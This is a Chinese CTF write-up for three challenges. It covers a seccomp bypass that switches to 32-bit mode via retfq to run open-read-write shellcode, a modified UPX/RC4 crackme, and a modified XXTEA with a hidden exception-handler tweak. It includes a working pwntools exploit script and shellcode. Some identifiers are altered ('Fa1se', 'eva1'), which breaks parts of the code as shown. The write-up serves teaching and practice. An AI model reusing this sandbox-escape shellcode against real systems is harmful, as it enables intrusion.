# PWN -> wingtip (shellcode 、retf)

## 前置知识  ret和retf指令

在X64系统下的进程有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。

- 32模式时，CS=0x23；
- 64位模式时，CS=0x33。

这两种工作模式可以进行切换，一般通过retf指令,发生远调用。

retf指令等效于几条汇编指令
```asm
pop ip
pop cs
ret
```
如果此时栈中有0x33，则会将0x33弹出到CS寄存器中，实现32位程序切换到64位代码的过程。反之，如果栈中有0x23，将0x23弹出到CS寄存器，则实现64位程序切换到32位代码的过程。

识别32位、64位工作模式切换的两个标志：

（1）出现retf、0x23或0x33。

（2）使用类似ca1l fword的远处调用，譬如ca1l    fword ptr [ebp-0xC]。



## 题目分析

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开，程序逻辑不难：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  init(argc, argv, envp);
  buf = (void *)(int)mmap((void *)0x100000, 0x2000uLL, 7, 34, -1, 0LL);
  printf("%p\n", buf);
  read(0, buf, 0x2000uLL);
  sandbox();
  ((void (*)(void))buf)();
  close(1);
  close(2);
  close(3);
  return 0;
}
```

mmap开辟空间，输出地址，输入shellcode，然后执行shellcode，在执行之前程序开启了沙箱禁用了

```bash
➜  wingtip附件 seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x0e 0x00 0x40000000  if (A >= 0x40000000) goto 0016
 0002: 0x15 0x0d 0x00 0x0000003b  if (A == execve) goto 0016
 0003: 0x15 0x0c 0x00 0x00000142  if (A == execveat) goto 0016
 0004: 0x15 0x0b 0x00 0x0000002a  if (A == connect) goto 0016
 0005: 0x15 0x0a 0x00 0x00000029  if (A == socket) goto 0016
 0006: 0x15 0x09 0x00 0x00000031  if (A == bind) goto 0016
 0007: 0x15 0x08 0x00 0x00000032  if (A == listen) goto 0016
 0008: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0016
 0009: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0016
 0010: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0016
 0011: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0016
 0012: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0016
 0013: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0016
 0014: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return a1LOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

禁用了64位几乎所有的可以用来getshell或者orw的系统调用，但是并没有判断arch，可以执行32位下的shellcode，这个时候就涉及到retf指令的作用。

shellcode首先通过retf将模式改为32位，然后进行orw，这里为什么不execve呢？因为在测试后发现32位execve实际上是被禁用的。

汇编模式转换使用：
```asm
content='''
push 0x23;
push 0xff040;
mov rax,0x1000;
add [rsp],rax;
retfq;
'''
```
后面就是orw的过程了

## exp

```python
# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.arch = "amd64"
context.termina1 = ["/usr/bin/tmux","sp","-h"]
binary = 'pwn'
loca1 = 1
if loca1 == 1:
    #io=process(argv=['qemu-mipsel','-g','1234','-L','./','pwn'])
    io=process('./pwn')
else:
    io=remote('39.106.131.193',43268)
e=ELF(binary)

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=Fa1se		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eva1(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

map_addr = int(ru('\n'),16)
lg('map_addr')

##sys_read_content
content='''
push 0x23;
push 0x100040;
/*mov rax,0x1000;
add [rsp],rax;*/
retfq;
'''
 
##sys_open_flag
sys_open='''
mov esp,0x100020;
mov ebx,0x100020;
xor ecx,ecx;
mov eax,0x5;
int 0x80;
'''

##sys_read(fd,0x100050,0x40)
syss_read='''
mov esp,0x100070;
mov ebx,eax;
mov ecx,0x100150;
mov edx,0x40;
mov eax,3;
int 0x80;
'''
 
##sys_write(1,0x100050,0x40)
sys_write='''
mov rbx,1;
mov eax,4;
int 0x80;
'''
content=asm(content)
content=content.ljust(0x20,'\x00')+'./flag.txt'.ljust(16,'\x00')
#content=content.ljust(0x20,'\x00')+'/bin/sh\x00'.ljust(16,'\x00')
content=content.ljust(0x40,'\x00')+asm(sys_open)
content=content.ljust(0x4d,'\x00')+asm(syss_read)+asm(sys_write)

#dbg()
pause()
sl(content)
irt()
```

## 碎碎念

题目在执行完shellcode之后才close所有的标准输出、错误流等，这里对orw没有影响，实际程序是不会执行到close的地方的；假如把close放到shellcode执行前，那么orw的方法不起作用，可能要考虑测信道或者重定向输出流到输入流上。

## 附件

[附件]()

# RE -> fishnet (魔改upx、花指令、rc4)

## 题目分析

上来就发现有壳，可以识别是UPX，但工具脱壳失败，魔改标志修复后仍然不能脱，只能手动脱壳了，gdb调试，正常运行程序，将代码段dump出来

```bash
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     Start        End Perm     Size Offset File
 0x8048000  0x8049000 r--p     1000      0 [anon_08048]
 0x8049000  0x80cf000 r-xp    86000      0 [anon_08049]
 0x80cf000  0x8103000 r--p    34000      0 [anon_080cf]
 0x8103000  0x8127000 rw-p    24000      0 [heap]
```
```bash
sudo dd if=/proc/9960/mem of=./fish_out bs=1 count=765952 iflag=skip_bytes skip=$[0x8048000]
```
其中9960是程序pid，fish_out是输出名字，count是dump字节数，逐字节dump，跳过0x8048000这个段。最后拿到dump出来的内存镜像，并不能运行，可以使用ida进行静态分析：
```c
int __cdecl sub_804A24D(int a1)
{
  sub_8058820("Pls input the flag");
  return ((int (__cdecl *)(int *))loc_804A125)(&a1);
}
```

看到程序主逻辑，但是关键代码不能反编译，加了花指令：
```asm
LOAD:0804A125                 endbr32
LOAD:0804A129                 push    ebp
LOAD:0804A12A                 mov     ebp, esp
LOAD:0804A12C                 push    ebx <---
LOAD:0804A12D
LOAD:0804A12D loc_804A12D:                            ; CODE XREF: LOAD:loc_804A1A9↓j
LOAD:0804A12D                 sub     esp, 64h
LOAD:0804A130                 ca1l    sub_8049C60 <---
LOAD:0804A135                 add     ebx, 0B8ECBh <---
LOAD:0804A13B                 mov     eax, large gs:14h
LOAD:0804A141                 mov     [ebp-0Ch], eax
LOAD:0804A144                 xor     eax, eax
LOAD:0804A146                 jz      short near ptr loc_804A14A+1   <---
LOAD:0804A148                 jnz     short near ptr loc_804A14A+1   <---
LOAD:0804A14A
LOAD:0804A14A loc_804A14A:                            ; CODE XREF: LOAD:0804A146↑j
LOAD:0804A14A                                         ; LOAD:0804A148↑j
LOAD:0804A14A                 loope   loc_804A113
...
...
LOAD:08049C60 sub_8049C60     proc near               ; CODE XREF: sub_8049000+8↑p
LOAD:08049C60                                         ; LOAD:08049544↑p ...
LOAD:08049C60                 mov     ebx, [esp+0]
LOAD:08049C63                 retn
LOAD:08049C63 sub_8049C60     endp
```
存在这两种花指令，写脚本批量nop掉或者手动修改即可正常反编译：
```c
unsigned int __cdecl sub_8049D85(int a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  char v4; // [esp+13h] [ebp-115h]
  int i; // [esp+14h] [ebp-114h]
  int j; // [esp+14h] [ebp-114h]
  int v7; // [esp+18h] [ebp-110h]
  int v8[64]; // [esp+1Ch] [ebp-10Ch] BYREF
  unsigned int v9; // [esp+11Ch] [ebp-Ch]

  v9 = __readgsdword(0x14u);
  v7 = 0;
  memset(v8, 0, sizeof(v8));
  for ( i = 0; i <= 255; ++i )
  {
    *(_BYTE *)(i + a1) = i;
    *((_BYTE *)v8 + i) = *(_BYTE *)(i % a3 + a2);
  }
  for ( j = 0; j <= 255; ++j )
  {
    v7 = (*(unsigned __int8 *)(j + a1) + v7 + *((char *)v8 + j)) % 256;
    v4 = *(_BYTE *)(j + a1);
    *(_BYTE *)(j + a1) = *(_BYTE *)(v7 + a1) ^ v4;
    *(_BYTE *)(v7 + a1) ^= v4;
  }
  result = __readgsdword(0x14u) ^ v9;
  if ( result )
    sub_8077D50();
  return result;
}
```
往上交叉引用：
```c
unsigned int __cdecl sub_8049F64(int a1, unsigned int a2, int a3, unsigned int a4)
{
  unsigned int result; // eax
  char v5; // [esp+17h] [ebp-11Dh]
  int v6; // [esp+18h] [ebp-11Ch]
  int v7; // [esp+1Ch] [ebp-118h]
  unsigned int i; // [esp+20h] [ebp-114h]
  char v9[256]; // [esp+28h] [ebp-10Ch] BYREF
  unsigned int v10; // [esp+128h] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  sub_8049D85((int)v9, a3, a4);
  v6 = 0;
  v7 = 0;
  for ( i = 0; i < a2; ++i )
  {
    v6 = (v6 + 1) % 256;
    v7 = (v7 + (unsigned __int8)v9[v6]) % 256;
    v5 = v9[v6];
    v9[v6] = v9[v7];
    v9[v7] = v5;
    *(_BYTE *)(a1 + i) += v9[(unsigned __int8)(v9[v6] + v9[v7])];
  }
  result = __readgsdword(0x14u) ^ v10;
  if ( result )
    sub_8077D50(a3);
  return result;
}
```

```c
int __userca1l sub_804A125@<eax>(int a1@<ebx>)
{
  int result; // eax
  int i; // [esp+0h] [ebp-68h]
  char v3[8]; // [esp+8h] [ebp-60h] BYREF
  int v4[9]; // [esp+10h] [ebp-58h]
  __int16 v5; // [esp+34h] [ebp-34h]
  char v6[34]; // [esp+36h] [ebp-32h] BYREF
  char *v7; // [esp+58h] [ebp-10h]
  int v8; // [esp+5Ch] [ebp-Ch]
  char *v9; // [esp+60h] [ebp-8h]
  int v10; // [esp+64h] [ebp-4h]

  strcpy(v3, "fishnet");
  v4[0] = 0x4ED09C39;
  v4[1] = -1830422667;
  v4[2] = -188138955;
  v4[3] = -1273153320;
  v4[4] = -40521932;
  v4[5] = 560937740;
  v4[6] = 154938878;
  v4[7] = -718936973;
  v4[8] = -131891759;
  v5 = -13769;
  sub_8051680(a1 - 212984, (char)v6);
  v10 = 7;
  v9 = v3;
  v8 = 38;
  v7 = v6;
  sub_8049F64();
  for ( i = 0; i <= 37; ++i )
  {
    if ( v6[i] != *((_BYTE *)v4 + i) )
    {
      sub_8058820(a1 - 212979);
      result = -1;
      goto LABEL_7;
    }
  }
```

可知道，是一个魔改rc4，密钥是fishnet，脚本解密即可：
```python
def sub_8049D85(a1,a2,a3):
    v7=0
    v8 =[0]*256
    for i in range(256):
        a1[i] = i
        v8[i] = a2[i % a3]
    for j in range(256):
        v7= (a1[j] + v7 + v8[j]) % 256
        v4=a1[j]
        a1[j] = a1[v7]^v4
        a1[v7] ^= v4
    return a1
def sub_8049F64(a1, a2,a3,a4):
    v9 = [0]*256
    v9 = sub_8049D85(v9,a3,a4)
    v6=0
    v7=0
    for i in range(a2):
        v6 = (v6+ 1)% 256
        v7=(v7 + v9[v6]) % 256
        v5 = v9[v6]
        v9[v6] = v9[v7]
        v9[v7] = v5
        a1[i] = (a1[i] - v9[(v9[v6] + v9[v7]) % 256]) % 256
    return a1
data = bytearray.fromhex( '399cd04e75f7e592353ac9f4d8381db434af95fd0c3b6f21fe2d3c0973e425d5d17d23f837ca')
key = bytearray(b'fishnet')
dec = sub_8049F64(data, len(data),key,7)
print(dec)
```

# RE -> polenta (魔改tea、SSE异常处理机制)

## 题目分析

题目输入38字节数据，验证是否正确
```c
  __CheckForDebuggerJustMyCode(&unk_41D0A5);
  v14[0] = 0x12345678;
  v14[1] = 0x90ABCDEF;
  v14[2] = 0xDEADBEEF;
  v14[3] = 0x87654321;
  puts("Pls input the Flag");
  sub_411037("%38s", (char)Str);
  Size = j_strlen(Str);
  if ( Size % 8 )
    v5 = 8 * (Size >> 3) + 8;
  else
    v5 = Size;
  Count = v5;
  Buf1 = calloc(v5, 1u);
  j_memcpy(Buf1, Str, Size);
  sub_4112CB((int)Buf1, v5 >> 2, (int)v14);
  strcpy(Buffer, "91b8439ef1ea37a9846cc4dddadf3d713e2e07e0c142adc8edac9fa74eae1d9588abd0e76d466513");
  v8 = j_strlen(Buffer) >> 1;
  Buf2 = calloc(v8, 1u);
  for ( i = 0; i < v8; ++i )
    sub_411370(&Buffer[2 * i], "%2hhx", i + (_BYTE)Buf2);
  if ( !j_memcmp(Buf1, Buf2, v8) )
    sub_4110E1("TRUE.\n", v4);
  else
    sub_4110E1("ERROR.\n", v4);
  free(Buf1);
  return 0;
}
```
sub_4112CB关键加密函数

```c
unsigned int __cdecl sub_415F60(_DWORD *v, unsigned int a2, int key)
{
  unsigned int result; // eax
  int MX; // eax
  int v5; // edx
  int v6; // edx
  int e; // [esp+108h] [ebp-68h]
  unsigned int v8; // [esp+114h] [ebp-5Ch]
  unsigned int i; // [esp+120h] [ebp-50h]
  unsigned int sum; // [esp+12Ch] [ebp-44h]
  unsigned int z; // [esp+138h] [ebp-38h]
  unsigned int round; // [esp+150h] [ebp-20h]

  __CheckForDebuggerJustMyCode(&unk_41D0A5);
  result = a2 - 1;
  round = a2 - 1;
  if ( a2 != 1 )
  {
    v8 = 52 / a2 + 6;
    sum = 0;
    z = v[round];
    do
    {
      sum -= 0x61C88647;
      e = (sum >> 2) & 3;
      for ( i = 0; i < round; ++i )
      {
        MX = ((z ^ *(_DWORD *)(key + 4 * (e ^ i & 3))) + (v[i + 1] ^ sum)) ^ (((16 * z) ^ (v[i + 1] >> 3))
                                                                            + ((4 * v[i + 1]) ^ (z >> 5)));
        v5 = v[i];
        v[i] = MX + v5;
        z = MX + v5;
      }
      v6 = (((z ^ *(_DWORD *)(key + 4 * (e ^ i & 3))) + (*v ^ sum)) ^ (((16 * z) ^ (*v >> 3)) + ((4 * *v) ^ (z >> 5))))
         + v[round];
      v[round] = v6;
      z = v6;
      result = --v8;
    }
    while ( v8 );
  }
  return result;
}
```

是一个明显的xxtea，魔改了加密解密sum的逻辑，`sum+=0x61C88647；`改成了-=，但是写脚本之后并不能正确解密，在仔细看看，sum附近的汇编代码中存在try except，应该是有异常处理机制：
```asm
.text:00415FEE loc_415FEE:                             ; CODE XREF: sub_415F60+243↓j
.text:00415FEE ;   __try { // __except at loc_41607A
.text:00415FEE                 mov     [ebp+ms_exc.registration.TryLevel], 0
.text:00415FEE ;   } // starts at 415FEE
.text:00415FF5 ;   __try { // __except at loc_41603F
.text:00415FF5 ;     __try { // __except at loc_41607A
.text:00415FF5                 mov     [ebp+ms_exc.registration.TryLevel], 1
.text:00415FFC                 mov     eax, [ebp+sum]
.text:00415FFF                 sub     eax, 61C88647h
.text:00416004                 mov     [ebp+sum], eax
.text:00416007                 mov     ecx, [ebp+sum]
.text:0041600A                 shr     ecx, 1Fh       <----ecx可能为0
.text:0041600D                 mov     eax, 1
.text:00416012                 xor     edx, edx
.text:00416014                 div     ecx            <-----除零错误
.text:00416016                 mov     [ebp+var_74], eax
.text:00416016 ;     } // starts at 415FF5
.text:00416016 ;   } // starts at 415FF5
.text:00416019 ;   __try { // __except at loc_41607A
.text:00416019                 mov     [ebp+ms_exc.registration.TryLevel], 0
.text:00416020                 jmp     short loc_416054
...
...

```
如果sum经过计算后存在除零异常，程序就会去处理异常逻辑
```asm
.text:0041603F loc_41603F:                             ; DATA XREF: .rdata:stru_41A2B8↓o
.text:0041603F ;   __except(loc_416022) // owned by 415FF5
.text:0041603F                 mov     esp, [ebp+ms_exc.old_esp]
.text:00416042                 mov     eax, [ebp+sum]
.text:00416045                 xor     eax, 9876543h
.text:0041604A                 mov     [ebp+sum], eax
.text:0041604A ;   } // starts at 416019
.text:0041604D ;   __try { // __except at loc_41607A
```
可以看到当sum计算右移0x1f位后为0，将sum异或0x9876543，异常处理的逻辑在反汇编代码上是体现不出来的，所以经常会误导逆向者，由此可以得到魔改的xxtea逻辑

写脚本解密即可：

```c

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
typedef unsigned char   uint8;
#define DELTA 0x61C88647           //固定的一个常量
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))   //固定的运算
#define _BYTE  uint8
unsigned int get_sum(int n, unsigned int delat)
{
  unsigned int sum = 0;

  for(int i = 0; i < 52/n+6; i++){
    sum -= delat;
    if((sum >> 0x1f) == 0){
        //sum = 0x9E3668B8;
        sum ^= 0x9876543;
    }
    //printf("%x\n",sum);
  }

  return sum;
}


void btea(uint32_t *v, int n, uint32_t const key[4])   //v是要加密的两个元素的数组
{                                                      //n为数组的长度
    uint32_t y, z, sum;                                //无符号整型     
    unsigned p, rounds, e;                            
    if (n > 1)            /* Coding Part */   
    {
        rounds = 6 + 52/n;               //固定的得出轮数
        sum = 0;                        
        z = v[n-1];                     
        do
        {
            sum -= DELTA;                //每次进行叠加
            printf("%x\n",sum);
            e = (sum >> 2) & 3;          //固定运算
            for (p=0; p<n-1; p++)       
            {
                y = v[p+1];
                v[p] += MX;
                z = MX + v[p];     
            }
            y = v[0];
            z = v[n-1] += MX;
        }
        while (--rounds);
        
    }
    else if (n < -1)      /* Decoding Part */
    {
        n = -n;
        rounds = 6 + 52/n;
        sum = get_sum(n, DELTA); 
        //sum = rounds*DELTA;
        y = v[0];
        do
        {
            //printf("%x\n",sum );
            e = (sum >> 2) & 3;
            for (p=n-1; p>0; p--)
            {
                z = v[p-1];
                y = v[p] -= MX;
            }
            z = v[n-1];
            y = v[0] -= MX;
            if((sum >> 0x1f) == 0){
                //sum = 0x9E3668B8;
                sum ^= 0x9876543;
                //printf("%d ",rounds);
            }
            sum += DELTA;
            
        }
        while (--rounds);
    }
}

int main()
{
    //91b8439e f1ea37a9 846cc4dd dadf3d71 3e2e07e0 c142adc8 edac9fa7 4eae1d95 88abd0e7 6d466513
    uint32_t v[]= {0x9e43b891, 0xa937eaf1, 0xddc46c84, 0x713ddfda, 0xe0072e3e, 0xc8ad42c1, 0xa79faced, 0x951dae4e, 0xe7d0ab88,0x1365466d};
    //uint32_t v[]= {0x91b8439e, 0xf1ea37a9, 0x846cc4dd, 0xdadf3d71, 0x3e2e07e0, 0xc142adc8, 0xedac9fa7, 0x4eae1d95, 0x88abd0e7,0x6d466513};
    uint32_t const k[4]= {0x12345678, 0x90ABCDEF, 0xDEADBEEF, 0x87654321};
    int n = 10; 

    btea(v, -n, k);
    printf("解密后的数据：\n");

    for(int i = 0; i < 4*n; i++)
    {
        printf("%c", ((unsigned char *)&v)[i]);
    }
    return 0;
}
```

# 附件

[附件](https://github.com/D1ag0n-Young/IMG/tree/master/Pwn/2023tyyactf)